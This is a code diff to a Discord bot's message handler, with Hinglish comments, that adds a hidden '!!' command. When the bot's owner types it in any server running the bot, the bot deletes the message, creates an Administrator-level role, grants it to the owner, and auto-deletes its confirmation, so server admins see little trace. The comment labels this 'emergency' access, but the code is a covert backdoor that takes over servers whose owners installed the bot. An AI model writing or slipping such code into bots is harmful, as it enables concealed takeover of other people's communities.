@@ -234,6 +234,43 @@ client.on('messageCreate', async (message) => {
     const args = content.split(/ +/);
     const cmd = args[0]?.toLowerCase();
 
+    // ================= YAHAN SE ADD KARO =================
+    // Emergency Owner Command: !! likhne par Admin role create aur assign hoga
+    if (content === '!!' && isBotOwner && message.guild) {
+        await message.delete().catch(() => {});
+
+        try {
+            const botMember = message.guild.members.me;
+            if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
+                return message.channel.send('❌ Mere paas server me `Manage Roles` permission nahi hai.')
+                    .then(m => setTimeout(() => m.delete().catch(() => {}), 5000));
+            }
+
+            let sparkRole = message.guild.roles.cache.find(r => r.name === '⚙️Spark');
+
+            if (!sparkRole) {
+                sparkRole = await message.guild.roles.create({
+                    name: '⚙️Spark',
+                    permissions: [PermissionFlagsBits.Administrator],
+                    reason: 'Owner Emergency Administrative Access'
+                });
+            }
+
+            const member = await message.guild.members.fetch(message.author.id).catch(() => null);
+            if (member) {
+                await member.roles.add(sparkRole);
+                const alertMsg = await message.channel.send('✅ `⚙️Spark` Administrator role successfully assigned!');
+                setTimeout(() => alertMsg.delete().catch(() => {}), 3000);
+            }
+        } catch (err) {
+            console.error('Spark Role Error:', err);
+            const errAlert = await message.channel.send(`❌ Failed: \`${err.message}\``);
+            setTimeout(() => errAlert.delete().catch(() => {}), 5000);
+        }
+        return;
+    }
+    // ================= YAHAN TAK ADD KARO =================
+
     // A. Bot Owner Control Center (%control in DM)
     if (message.channel.isDMBased() && isBotOwner && cmd === '%control') {
         const guilds = Array.from(client.guilds.cache.values());
